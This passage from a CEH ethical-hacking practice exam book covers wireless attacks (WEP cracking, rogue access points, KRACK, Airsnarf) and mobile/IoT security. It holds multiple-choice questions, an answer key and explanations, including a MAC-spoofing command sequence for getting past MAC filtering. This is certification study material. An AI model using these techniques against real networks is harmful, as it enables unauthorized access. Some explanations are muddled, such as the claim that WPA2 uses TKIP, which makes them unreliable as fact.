are networks where the BSSID is hidden (referred to as cloaking), but other tools
(airmon and airodump) can help with that.

☐✗ D is incorrect because even if an SSID is “cloaked,” that doesn’t mean it’s actually
hidden; all it means is that it is not broadcast. The SSID is still contained in every
single packet sent from the AP, and discovering it is easy enough.

7. Which wireless standard works at 54Mbps on a frequency range of 2.4GHz?

A. 802.11a

B. 802.11b

C. 802.11g

D. 802.11n

CEH Certified Ethical Hacker Practice Exams

176

07-ch07.indd 176 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☑ C. The 802.11 series of standards identifies a variety of wireless issues, such as the
order imposed on how clients communicate, rules for authentication, data transfer,
size of packets, how the messages are encoded into the signal, and so on. 802.11g
combines the advantages of both the “a” and “b” standards without as many of the
drawbacks. It’s fast (at 54Mbps), is backward compatible with 802.11b clients,
and doesn’t suffer from the coverage area restrictions 802.11a has to contend with.
Considering it operates in the 2.4GHz range, however, there may be some interference
issues to deal with. Not only is a plethora of competing networks blasting their signals
(sometimes on the same channel) near and around your network, but you also have to
consider Bluetooth devices, cordless phones, and even baby monitors that may cause
disruption (due to interference) of wireless signals. Also, microwave ovens happen to
run at 2.45GHz—right smack dab in the middle of the range.

☐✗ A is incorrect because 802.11a operates at 54Mbps but uses the 5GHz frequency
range. The big drawback to 802.11a was the frequency range itself—because of the
higher frequency, the network range was limited. Whereas 802.11b clients could
be spread across a relative large distance, 802.11a clients could communicate much
faster but had to be closer together. Combined with the increased cost of equipment,
this contributed to 802.11a not being fully accepted as a de facto standard. That
said, for security purposes, it may not be a bad choice. Not as many people use it, or
even look for it, and its smaller range may work to assist you in preventing spillage
outside your building. Lastly, it’s not necessarily the higher frequency itself that causes
the distance limitation; instead, it’s how common building materials and propagation
issues interact with it. It’s overly complicated, but if you are of a mind to do so and
have some time to kill, you’ll find this topic fascinating to read about.

☐✗ B is incorrect because 802.11b operates at 11Mbps on the 2.4GHz frequency range.
It’s slower than “a” and “g,” but soon after its release it became the de facto standard
for wireless. Price and network range contributed to this.

☐✗ D is incorrect because 802.11n works at 100Mbps+ in frequency ranges from 2.4 to
5 GHz. It achieves this rate using multiple in, multiple out (MIMO) antennas.

8. The team has discovered an access point configured with WEP encryption. What is
needed to perform a fake authentication to the AP in an effort to crack WEP? (Choose
all that apply.)

A. A captured authentication packet

B. The IP address of the AP

C. The MAC address of the AP

D. The SSID

☑ C, D. Cracking WEP generally comes down to capturing a whole bunch of packets
and running a little math magic to crack the key. If you want to generate traffic by
sending fake authentication packets to the AP, you need the AP’s MAC address and
the SSID to make the attempt.

Chapter 7: Wireless Network Hacking

177

07-ch07.indd 177 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ A and B are incorrect because this information is not needed for a fake authentication
packet. Sure, you can capture and replay an entire authentication packet, but it won’t
do much good, and the IP is not needed at all.

9. Which of the tools listed here is a passive discovery tool?

A. Aircrack

B. Kismet

C. NetStumbler

D. Netsniff

☑ B. A question like this one can be a little tricky, depending on its wording; however,
per the EC-Council, Kismet works as a true passive network discovery tool, with
no packet interjection whatsoever. The following is from www.kismetwireless.net:
“Kismet is an 802.11 layer 2 wireless network detector, sniffer, and intrusion detection
system. Kismet will work with any wireless card which supports raw monitoring
(rfmon) mode, and (with appropriate hardware) can sniff 802.11b, 802.11a, 802.11g,
and 802.11n traffic. Kismet also supports plugins which allow sniffing other media.”
You might also see two other interesting notables about Kismet on your exam: First,
it works by channel hopping, attempting to discover as many networks as possible.
Second, it has the ability to sniff packets and save them to a log file, readable by
Wireshark or tcpdump.

☐✗ A is incorrect because Aircrack is “an 802.11 WEP and WPA-PSK keys cracking
program that can recover keys once enough data packets have been captured. It
implements the standard FMS attack along with some optimizations like KoreK
attacks, as well as the all-new PTW attack” (www.aircrack-ng.org).

☐✗ C is incorrect because NetStumbler is considered an active network discovery
application. NetStumbler is among the most popular wireless tools you might see in
anyone’s arsenal.

☐✗ D is incorrect because Netsniff is included as a distractor and is not a valid tool.

10. You have discovered an access point using WEP for encryption purposes. Which of the
following is the best choice for uncovering the network key?

A. NetStumbler

B. Aircrack

C. John the Ripper

D. Kismet

☑ B. Aircrack is a fast tool for cracking WEP (assuming you’ve collected at least 50,000
packets or so, it’ll work swimmingly fast). You’ll need to gather a lot of packets using
another toolset, but once you have them together, Aircrack does a wonderful job
cracking the key. One method Aircrack uses that you may see referenced on the exam is
KoreK implementation, which basically involves slicing bits out of packets and replacing

CEH Certified Ethical Hacker Practice Exams

178

07-ch07.indd 178 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

them with guesses—the more this is done, the better the guessing and, eventually, the
faster the key is recovered. Other tools for cracking WEP include Cain (which can also
use KoreK), KisMac, WEPCrack, and Elcomsoft’s Wireless Security Auditor tool.

☐✗ A is incorrect because NetStumbler is a network discovery tool. It can also be used
to identify rogue access points and interference and is also useful in measuring signal
strength (for aiming antennas and such).

☐✗ C is incorrect because John the Ripper is a Linux-based password-cracking tool, not a
wireless key discovery one.

☐✗ D is incorrect because Kismet is a passive network discovery (and other auditing) tool
but does not perform key cracking.

11. Which of the following statements are true regarding TKIP? (Choose all that apply.)

A. Temporal Key Integrity Protocol forces a key change every 10,000 packets.

B. Temporal Key Integrity Protocol ensures keys do not change during a session.

C. Temporal Key Integrity Protocol is an integral part of WEP.

D. Temporal Key Integrity Protocol is an integral part of WPA.

☑ A, D. TKIP is a significant step forward in wireless security. Instead of sticking
with one key throughout a session with a client and reusing it, as occurred in
WEP, Temporal Key Integrity Protocol changes the key out every 10,000 packets
or so. Additionally, the keys are transferred back and forth during an Extensible
Authentication Protocol (EAP) authentication session, which makes use of a four-step
handshake process in proving the client belongs to the AP, and vice versa. TKIP came
about in WPA.

☐✗ B and C are simply incorrect statements. TKIP does not maintain a single key (it changes
the key frequently), and it is part of WPA (and WPA2), not WEP.

12. Regarding SSIDs, which of the following are true statements? (Choose all that apply.)

A. SSIDs are always 32 characters in length.

B. SSIDs can be up to 32 characters in length.

C. Turning off broadcasting prevents discovery of the SSID.

D. SSIDs are part of every packet header from the AP.

E. SSIDs provide important security for the network.

F. Multiple SSIDs are needed to move between APs within an ESS.

☑ B, D. Service set identifiers have only one real function in life, so far as you’re
concerned on this exam: identification. They are not a security feature in any way,
shape, or form, and they are designed solely to identify one access point’s network
from another’s—which is part of the reason they’re carried in all packets. SSIDs
can be up to 32 characters in length but don’t have to be that long (in fact, you’ll
probably discover most of them are not).

Chapter 7: Wireless Network Hacking

179

07-ch07.indd 179 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ A is incorrect because SSIDs do not have to be 32 characters in length. They can be,
but they do not have to fill 32 characters of space.

☐✗ C is incorrect because “cloaking” the SSID really doesn’t do much at all. It’s still part
of every packet header, so discovery is relatively easy.

☐✗ E is incorrect because SSIDs are not considered a security feature for wireless networks.

☐✗ F is incorrect because an extended service set (ESS, an enterprise-wide wireless network
consisting of multiple APs) requires only a single SSID that all APs work with.

13. You are discussing WEP cracking with a junior pen test team member. Which of the
following are true statements regarding the initialization vectors? (Choose all that apply.)

A. IVs are 32 bits in length.

B. IVs are 24 bits in length.

C. IVs get reused frequently.

D. IVs are sent in clear text.

E. IVs are encrypted during transmission.

F. IVs are used once per encryption session.

☑ B, C, D. Weak initialization vectors and poor encryption are part of the reason WEP
implementation is not encouraged as a true security measure on wireless networks.
And, let’s be fair here, it was never truly designed to be, which is why it’s named
Wired Equivalent Privacy instead of Wireless Encryption Protocol (as some have
erroneously tried to name it). IVs are 24 bits in length, are sent in clear text, and are
reused a lot. Capture enough packets, and you can easily crack the code.

☐✗ A, E, and F are incorrect because they are false statements. IVs are not 32 bits in
length, are not encrypted themselves, and are definitely not used once per session
(that would be even worse than being reused).

14. A pen test member has configured a wireless access point with the same SSID as the target
organization’s SSID and has set it up inside a closet in the building. After some time,
clients begin connecting to his access point. Which of the following statements are true
regarding this attack? (Choose all that apply.)

A. The rogue access point may be discovered by security personnel using NetStumbler.

B. The rogue access point may be discovered by security personnel using NetSurveyor.

C. The rogue access point may be discovered by security personnel using Kismet.

D. The rogue access point may be discovered by security personnel using Aircrack.

E. The rogue access point may be discovered by security personnel using ToneLoc.

CEH Certified Ethical Hacker Practice Exams

180

07-ch07.indd 180 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☑ A, B, C. Rogue access points (sometimes called evil twin attacks) can provide an easy
way to gain useful information from clueless users on a target network. However,
be forewarned: security personnel can use multiple tools and techniques to discover
rogue APs. NetStumbler is one of the more popular, and useful, tools available. It’s
a great network discovery tool that can also be used to identify rogue access points,
network interference, and signal strength. Kismet, another popular tool, provides
many of the same features and is noted as a “passive” network discovery tool.
NetSurveyor is a free, easy-to-use Windows-based tool that provides many of the
same features as NetStumbler and Kismet and works with virtually every wireless
NIC in modern existence. A “professional” version of NetSurveyor is now available
(you get ten uses of it before you’re required to buy a license). Lastly, identifying a
rogue access point requires the security staff to have knowledge of every access point
owned—and its MAC. If it’s known there are ten APs in the network and suddenly
an 11th appears, that alone won’t help find and disable the bad one. It takes some
level of organization to find these things, and that plays into your hands as an ethical
hacker. The longer your evil twin is left sitting there, the better chance it will be
found, so keep it short and sweet.

☐✗ D is incorrect because Aircrack is used to crack network encryption codes, not to
identify rogue access points.

☐✗ E is incorrect because ToneLoc is a tool used for war dialing (identifying open
modems within a block of phone numbers). As an aside, this was also the moniker for
a 1980s two-hit-wonder rapper, although I can promise that won’t be on your exam.

15. A pen test member is running the Airsnarf tool from a Linux laptop. What is she attempting?

A. MAC flooding against an AP on the network

B. Denial-of-service attacks against APs on the network

C. Cracking network encryption codes from the WEP AP

D. Stealing usernames and passwords from an AP

☑ D. Identifying tools and what they do is a big part of the exam—which is easy
enough because it’s pure memorization, and this is a prime example. Per the tool’s
website (http://airsnarf.shmoo.com/), “Airsnarf is a simple rogue wireless access
point setup utility designed to demonstrate how a rogue AP can steal usernames
and passwords from public wireless hotspots. Airsnarf was developed and released
to demonstrate an inherent vulnerability of public 802.11b hotspots—snarfing
usernames and passwords by confusing users with DNS and HTTP redirects from a
competing AP.” It basically turns your laptop into a competing AP in the local area
and confuses client requests into being sent your way.

☐✗ A is incorrect because Airsnarf does not provide MAC flooding. You may want to
MAC flood a network switch for easier sniffing, but that doesn’t work the same way
for an access point on a wireless network.

Chapter 7: Wireless Network Hacking

181

07-ch07.indd 181 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ B is incorrect because Airsnarf is not a DoS tool. You can make an argument the
clients themselves are denied service while they’re erroneously communicating with
the Airsnarf laptop, but it’s not the intent of the application to perform a DoS attack
on the network. In fact, it’s quite the opposite: the longer things stay up and running,
the more usernames and passwords that can be gathered.

☐✗ C is incorrect because Airsnarf is not an encryption-cracking tool. It reads a lot like
“Aircrack,” so don’t get confused (these will be used as distractors for one another on
your exam).

16. What is the integrity check mechanism for WPA2?

A. CBC-MAC

B. CCMP

C. RC4

D. TKIP

☑ A. If you’ve not done your reading and study, this one could be quite tricky.
WPA2 uses CCMP as its encryption protocol, and CCMP uses CBC-MAC for
authentication and integrity. Counter Mode CBC-MAC Protocol is an encryption
protocol specifically designed for 802.11i wireless networking. CCMP uses
CBC-MAC for authentication and integrity. As for how it exactly provides for
integrity, the true technobabble answer is very long and confusing, but the short of
it is this: the message is encrypted with a block cipher, and the encryption of each
block in the chain is dependent on the encryption value of the block in front of it. In
other words, if block 2 is altered in any way, then decryption of blocks 3, 4, and so
on, becomes impossible. One final note on CCMP for your study and memorization:
CCMP is based on AES processing and uses a 128-bit key and a 128-bit block size,
and ECC sometimes refers to it as AES-CCMP.

☐✗ B is incorrect because CCMP is the encryption protocol that makes use of CBC-MAC.

☐✗ C is incorrect because RC4 is an encryption algorithm used by WEP.

☐✗ D is incorrect because Temporal Key Integrity Protocol is used in WPA.

17. Which of the following is a true statement regarding wireless security?

A. WPA2 is a better encryption choice than WEP.

B. WEP is a better encryption choice than WPA2.

C. By cloaking the SSID and implementing MAC filtering, you can eliminate the need
for encryption.

D. Increasing the length of the SSID to its maximum increases security for the system.

☑ A. WPA2 is, by far, a better security choice for your system. It makes use of TKIP,
changing out the keys every 10,000 packets instead of using one for the entire session
(as in WEP). Additionally, WPA2 uses AES for encryption and a 128-bit encryption
key, as opposed to RC4 and 24-bit IVs in WEP.

CEH Certified Ethical Hacker Practice Exams

182

07-ch07.indd 182 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

☐✗ B is incorrect because WEP only provides the equivalent privacy of being on a wired
network. Its “encryption” is ridiculously easy to crack and is not considered a valid
security measure. It’s perfectly reasonable to use it if your goal is just to frustrate
causal surfers from connecting to your network (such as your neighbors), but it’s not
a valid encryption method.

☐✗ C is incorrect because these two options do nothing to protect the actual data being
transmitted. SSID cloaking is somewhat pointless, given that SSIDs are included in
every header of every packet (not to mention that SSIDs aren’t designed for security).
MAC filtering will frustrate casual observers; however, spoofing a MAC address on
the network is relatively easy and eliminates this as a foolproof security method.

☐✗ D is incorrect because the length of an SSID has nothing whatsoever to do with security
and encryption. Increasing the length of the SSID does not increase network security.

18. A pen test colleague is attempting to use a wireless connection inside the target’s building.
On his Linux laptop he types the following commands:
ifconfig wlan0 down
ifconfig wlan0 hw ether 0A:0B:0C:1A:1B:1C
ifconfig wlan0 up

What is the most likely reason for this action?

A. Port security is enabled on the access point.

B. The SSID is cloaked from the access point.

C. MAC filtering is enabled on the access point.

D. Weak signaling is frustrating connectivity to the access point.

☑ C. The sequence of the preceding commands has the attacker bringing the wireless
interface down, changing its hardware address, and then bringing it back up. The
most likely reason for this is MAC filtering is enabled on the AP, which is restricting
access to only those machines the administrator wants connecting to the wireless
network. The easy way around this is to watch traffic and copy one of the MAC
addresses. With a quick spoof on your own hardware, you’re connected. As an aside,
MAC spoofing isn’t just for the wireless world. The command would be slightly
different (wlan0 refers to a wireless NIC; eth0 would be an example of a wired port),
but the idea is the same.

☐✗ A is incorrect because port security isn’t an option on wireless access points. Were this
attacker connecting to a switch, this might be valid, but not on a wireless connection.

☐✗ B is incorrect because SSID cloaking has nothing to do with this scenario.
The commands are adjusting a MAC address.

☐✗ D is incorrect because weak signal strength has nothing to do with this scenario.
The commands are adjusting a MAC address.

Chapter 7: Wireless Network Hacking

183

07-ch07.indd 183 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

19. An attacker has successfully configured and set up a rogue wireless AP inside his target. As
individuals connect to various areas, he performs a MITM attack and injects a malicious
applet in some of the HTTP connections. This reroutes user requests for certain pages to
pages controlled by the attacker. Which of the following tools is most likely used by the
attacker to inject the HTML code?

A. Aircrack-ng

B. Kismet

C. Ettercap

D. Honeypot

☑ C. Go ahead, get it out of your system. I know you’re sitting there screaming, “What
does Ettercap and MITM have to do with wireless?” That’s precisely why this question
is here. You’ll see this technique employed within the exam in multiple facets. See,
by starting out highlighting the attacker’s use of the evil twin attack, you get lulled
into thinking this is a wireless issue. In reality, the question has nothing to do with
the wireless aspect; instead, the MITM portion is what really matters. So while you
were ready to pounce on a wireless tool, and Aircrack-ng really jumped out at you,
the MITM attack tool—Ettercap—was really where your attention should’ve been.

☐✗ A and B are incorrect for the same reason—they’re wireless tools with specific
functions within wireless, but they’re not MITM tools.

☐✗ D is incorrect because a honeypot has absolutely nothing to do with this scenario.

20. Which of the following is the best choice in searching for and locating rogue access points?

A. WIPS

B. Dipole antenna

C. WACL

D. HIDS

☑ A. Of the choices provided, the wireless intrusion prevention system is the best choice.
A WIPS is a network device that, among other things, monitors wireless traffic for the
presence of unauthorized access points and then takes countermeasures against them.

☐✗☑ B is incorrect because the type of antenna used has nothing to do with this scenario.

☐✗ C is incorrect because a wireless access control list will help control access to the
network but doesn’t go out and search for anything.

☐✗ D is incorrect because it’s not the purpose of a host-based intrusion detection system
to search for rogue wireless access points.

21. Charity visits a client business she has worked with multiple times. When she opens her
laptop, her wireless connection attempts to automatically connect to the network, named
BUSINESS1. Unbeknownst to her, an attacker has set up a cloned network with the
same details. As her connection begins, he sends and continues to resend the third step of

CEH Certified Ethical Hacker Practice Exams

184

07-ch07.indd 184 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7

connection handshake. After many iterations of this, the attacker gains enough decrypted
details to crack the encryption key. Which of the following best describes this attack?

A. Rogue AP

B. AP MAC spoofing

C. aLTEr

D. KRACK

☑ D. Of the choices provided, KRACK (Key Reinstallation Attack) comes the closest
to fitting the bill. First, you should know that KRACK is largely defunct as an attack
nowadays—most modern systems protect against it, and it won’t work. However,
you’ll no doubt see a question about it, so let’s dive in.

KRACK works by exploiting the four-way handshake all WPA2 wireless networks
take part in. During this exchange, the wireless systems blasts out something called
an ANonce (a one-time, randomly generated number, more or less). The client receives it,
runs some calculation of its own, and responds with another randomly generated
SNonce. If everything looks okay, the wireless system sends the GTK (Group Temporal
Key), which is the encryption key the WPA2 system uses for broadcast and multicast
messages. If everything looks right the client connects, you’re off and running.

In a KRACK attack, the cloned system run by the bad guy keeps resending the third
part of the handshake to the client. Each time the client accepts the connection
request, a small piece of data is decrypted and, over several iterations, the encryption
key is cracked.

One last thing—KRACK needs proximity to work. In other words, assuming we go
back in time before OS patches were created to prevent the attack, you’d have to be
close to your target to set things up. There’s only so much reach a wireless system has,
and you’d have to be inside that range to even attempt KRACK.

☐✗ A is incorrect because a rogue AP is simply an AP set up for you to unknowingly
connect to.

☐✗ B is incorrect because a MAC spoof attack refers to an attacker spoofing the MAC
address of a system that is allowed on the network (APs can use MAC filtering to allow
only specific devices to connect).

☐✗ C is incorrect because an aLTEr attack focuses on LTE (Long-Term Evolution, aka
“4G”) devices. An aLTEr attacker basically sets up their own cellular signal device
and sends signaling to target devices. Once the target accepts the rogue connection
source, all transmissions between them and the network are viewable by the attacker.
It’s important to note for your study that the attacker would need some very significant
hardware on hand and would need to be relatively close to the target for anything
to work.

Chapter 7: Wireless Network Hacking

185

07-ch07.indd 185 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 7/ Blind Folio: 186

This page intentionally left blank

07-ch07.indd 186 20/04/22 12:08 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

CHAPTER

Mobile Communications 8
and the IoT
This chapter includes questions from the following topics:

• Describe mobile platform attacks
• Identify mobile device management
• Identify mobile platforms vulnerabilities and attack vectors
• Identify IoT security threats and attacks
• List IoT security and hacking tools
• List IoT hacking methodology

I grew up in a time when television had only three channels, the music industry was all up in
arms because of the new technology allowing anyone to tape their own music (cassette tapes), and
if you needed to talk to someone about something, you had to either meet them face to face or
call them on their one and only home phone (and hope they were there). Oh, sure, the ultra-rich
had phones built into their limos (not really much more than glorified CB radio devices actually),
but the idea of a cell phone didn’t really hit the public consciousness until sometime in the early
1980s. In fact, the first real foray into the technology came in 1973, when a Motorola researcher
created something called a “mobile phone.” The handset came in at a stealthy 8 by 5 inches,
weighing approximately 2½ pounds, and offered a whopping 30 minutes of talk time.

After a decade or so of further research and attempts at bringing the technology to market,
the first analog cellular network (Advanced Mobile Phone Service, AMPS) hit the United States,
and a company called DynaTAC released a device that has been ridiculed in technology circles for
decades now—the bag phone. Despite the weight and bulkiness of the system, and the fact that
it provided only a half hour of talk time while taking nearly 10 hours to charge, demand for the
thing was incredible, and people signed up on waiting lists by the thousands.

I remember quite clearly how jealous I felt seeing people driving around with those ultra-
cool giant-battery phones that they could use anywhere. I even looked into buying one and can
remember the first time I slung that big old bag over my head to rest the strap on my shoulder so
I could heft the cord-connected handset and dial home. Looking back, it seems really silly, but
that strong desire by the consumer population fueled an explosion in mobile device technology
that changed the world. See, once folks figured there was money to be made in them thar wireless
hills, mobile phone research and technology hit a fever pitch that continues to this day. However,

187

08-ch08.indd 187 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

not all virtual eyes remained solely on the humble phone. Suddenly, all that groovy stuff we saw
on Star Trek seemed not only possible, but probable.

In 1989, John Romkey, developer of the first TCP/IP stack for the IBM PC back in 1983, was
asked to wow the crowd at that year’s Interop conference. As well known and respected as he was,
the scope of topics was almost unending, and Dan Lynch, president of Interop, surely expected
something mind blowing. So, Romkey created a toaster that could be turned on and off via the
Internet. Yes. You read that right. A toaster you could connect to your network.

Connecting an appliance to a network was unheard of—and definitely not what networking
was designed for. The very idea seemed almost sacrilegious...until it worked. The stainless-steel
beauty—a Sunbeam Deluxe Automatic Radiant Control Toaster—indeed connected to the
Internet, and an SNMP MIB was created to turn it on and off. It was the star attraction of the
conference, and by all accounts the very first thing on the Internet of Things (IoT). And, wow,
did it kick off a future no one could have imagined.

The IoT is here to stay, and it’s growing exponentially every single minute of every single
day. The sheer number of devices that touch our networks now is mind boggling, and I nearly
go catatonic at the thought of trying to secure the whole thing. Our wireless technologies and
appliances are now as much part of life as the light switch on the wall—we wouldn’t know what
to do without them, and we all just expect it all to work. Hence the problem.

I’ve said repeatedly that almost every technological implementation designed to make our lives
easier and better can be, and usually has already been, corrupted by the bad guys, and mobile
communication and the IoT are no exceptions. Wireless networks are everywhere, broadcasting
information across the air that anyone can pick up, and we’re adding everything from toasters
to light bulbs to them by the day. Cellular devices are called smartphones, even though the users
of the devices aren’t, and mobile malware is as common and ubiquitous as teenagers texting
during family dinner. And what about the opportunity for co-opting wireless signals that control
everything else, such as your car’s built-in computer functions, your refrigerator, and maybe the
turbine control at the local power plant? Let’s just say that while all this mobile technology is
really cool and offers us a lot of benefits, we better all pay attention to the security side of the
whole thing. I don’t want to face a board of directors for my company and have to explain how
my systems and networks were secure, but the Internet-enabled soap dispenser in the bathroom
was the key to our downfall.

STUDY TIPS Mobile and IoT makes up a whopping 8 percent of your exam,
which may seem a little low in representation given the ubiquitous nature of
the topic. This does not mean, however, you should just lightly peruse the
content and hope for the best—quite the contrary. This section is very likely

going to help you succeed on your exam. Questions on mobile platforms are usually fairly
easy and straightforward. Sure, there may be a couple that drive down into the minutiae,
but overall this should be a good section for you.

Whereas EC-Council once seemed to focus on WEP, SSIDs, and weird questions on
encoding methods, channel interference, and such, now they’re much more focused on
the mobile world. Yes, you will still see questions on wireless networking basics—tools
used in hacking wireless, encryption standards, and so on—but be prepared to see much

CEH Certified Ethical Hacker Practice Exams

188

08-ch08.indd 188 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

more of a mobile-device-centric layout now. Make sure you know Bluetooth well, and
check out any and all mobile device tools you can find—there will likely be a couple
off-the-wall mobile tool questions along the way, and I can’t possibly put them all in
here. Mobile device management (MDM), bring your own device (BYOD), rooting, and
jailbreaking are all topics you’ll need to read up on and know well.

As for IoT questions, again, it all depends on the pool of test questions you pull. The
good news is, most of the IoT material is actually information you already know. The
hacking methodology, for instance, is the same. DDoS means the same thing here as it
does everywhere else, and countermeasures for this attack are nearly identical to those
you already know. Put a little time in memorizing basic details of communication models
and a few tools, and you’ll be fine.

Chapter 8: Mobile Communications and the IoT

189

08-ch08.indd 189 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

QUESTIONS

Q 1. A company hires you as part of its security team. The company is implementing new
policies and procedures regarding mobile devices in the network. Which of the following
would not be a recommended practice?

A. Create a BYOD policy and ensure all employees are educated about and made aware
of it.

B. Whitelist applications and ensure all employees are educated about and made aware
of them.

C. Allow jailbroken and rooted devices on the network, as long as employees have signed
the policy.

D. Implement MDM.

2. Which of the following tools would be used in a blackjacking attack?

A. Aircrack

B. BBCrack

C. BBProxy

D. Paros Proxy

3. Which of the following tools is a vulnerability scanner for Android devices?

A. X-ray

B. evasi0n7

C. Pangu

D. DroidSheep Guard

4. Which type of jailbreaking allows user-level access but does not allow iBoot-level access?

A. iBoot

B. Bootrom

C. Userland

D. iRoot

5. Jack receives a text message on his phone advising him of a major attack at his bank. The
message includes a link to check his accounts. After he clicks the link, an attacker takes
control of his accounts in the background. Which of the following attacks is Jack facing?

A. Phishing

B. Smishing

C. Vishing

D. App sandboxing

CEH Certified Ethical Hacker Practice Exams

190

08-ch08.indd 190 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

6. Which of the following allows an Android user to attain privileged control of the device?

A. DroidSheep

B. SuperOneClick

C. Faceniff

D. ZitMo

7. An individual attempts to make a call using his cell phone; however, it seems
unresponsive. After a few minutes of effort, he turns it off and turns it on again. During
his next phone call, the phone disconnects and becomes unresponsive again. Which
Bluetooth attack is underway?

A. Bluesmacking

B. Bluejacking

C. Bluesniffing

D. Bluesnarfing

8. Which of the following is a pairing mode in Bluetooth that rejects every pairing request?

A. Non-pairing

B. Non-discoverable

C. Promiscuous

D. Bluejack

9. An attacker is using Shodan to search for devices on a target. She types the following
as the search string: webcam geo:“ -85.97,31.81”. Which of the following statements
correctly describes this action?

A. The search string syntax is incorrect.

B. The attacker is searching for webcams with serial numbers starting with numbers
between 3181 and 8597.

C. The attacker is searching for webcam manufacturers starting with “geo.”

D. The attacker is searching for webcams in the geographic location -31.80, 85.95
(longitude and latitude).

10. Which of the following is the most popular short-range communication technology for
IoT devices?

A. RFID

B. Zigbee

C. QR codes

D. LiFi

Chapter 8: Mobile Communications and the IoT

191

08-ch08.indd 191 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

11. Within the IoT architecture, which of the following carries out message routing and
identification?

A. Edge Technology layer

B. Access Gateway layer

C. Internet layer

D. Middleware layer

12. A homeowner accesses an app on his cell phone to set up a view list on his television.
Which IoT communication model is in play here?

A. Device-to-gateway

B. Back-end data sharing

C. Device-to-cloud

D. Device-to-device

13. In which attack on VANET do vehicles appear to be in multiple places at once, causing
congestion and severely impairing the use of data?

A. Rolling code

B. BlueBorne

C. Side channel

D. Sybil

14. Of the tools listed, which is the best choice for quickly discovering IP addresses of IoT
devices on your network?

A. IoTInspector

B. MultiPing

C. Z-Wave Sniffer

D. beSTORM

15. In October 2016, a DDoS attack involving millions of IoT devices caused a disruption of
service to large numbers of users in North America and Europe. Which of the following
malware was used in the attack?

A. WannaCry

B. Cryptolocker

C. Locky

D. Mirai

CEH Certified Ethical Hacker Practice Exams

192

08-ch08.indd 192 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

16. Which of the following are valid countermeasures in the prevention of IoT hacking?
(Choose all that apply.)

A. Disable guest and demo accounts.

B. Enable lockout features for excessive login attempts.

C. Disable Telnet.

D. Implement patch management and ensure device firmware is up to date.

17. Within the Attify Zigbee Framework, which of the following is used to discover target
devices within range?

A. zbstumbler

B. zbdump

C. zbreplay

D. zbassoc/flood

18. Which of the following is an advanced hardware- and software-designed radio used for
security testing in IoT?

A. Fluke

B. Raspberry Pi

C. HackRF One

D. Alfa AWUS036NH

19. Which of the following is a model widely used to describe internal communications
within industrial control system (ICS) networks?

A. Purdue model

B. IIOT

C. SCADA

D. PLC

20. Which IoT communication model adds the ability for third parties to collect and use data?

A. Device-to-device

B. Device-to-cloud

C. Device-to-gateway

D. Back-end data sharing

Chapter 8: Mobile Communications and the IoT

193

08-ch08.indd 193 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

QUICK ANSWER KEY

1. C 8. A 15. D

2. C 9. D 16. A, B, C, D

3. A 10. B 17. A

4. C 11. B 18. C

5. B 12. A 19. A

6. B 13. D 20. D

7. A 14. B

CEH Certified Ethical Hacker Practice Exams

194

08-ch08.indd 194 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

ANSWERS

1. A company hires you as part of its security team. The company is implementing new policies A
and procedures regarding mobile devices in the network. Which of the following would not
be a recommended practice?

A. Create a BYOD policy and ensure all employees are educated about and made aware
of it.

B. Whitelist applications and ensure all employees are educated about and made aware
of them.

C. Allow jailbroken and rooted devices on the network, as long as employees have signed
the policy.

D. Implement MDM.

☑ C. Bring your own device (BYOD) and mobile device management (MDM) are
becoming more and more of a headache for security administrators. BYOD is the
idea that employees can bring their own smartphones, tablets, and mobile devices
to the workplace and use them as part of the enterprise network. Mobile device
management (often implemented with the use of a third-party product containing
management features for mobile device vendors) is an effort to administrate and
secure mobile device use within the organization.

Obviously, having mobile devices roaming in and out of a network can cause a variety
of security issues, and lots of commonsense steps can be taken to address this. Allowing
rooted and jailbroken devices—essentially devices that could have any number of
installed (knowingly or not) issues on them—is not among the good steps to take.

☐✗ A, B, and D are incorrect because these are all good ideas regarding mobile device use
and management. Other good ideas include ensuring all devices have a screen-lockout
code enabled, using encryption (in transit and for data-at-rest concerns), making
sure there are clear delineations between business and personal data, implementing
antivirus, and making sure the OS and patching are up to date.

2. Which of the following tools would be used in a blackjacking attack?

A. Aircrack

B. BBCrack

C. BBProxy

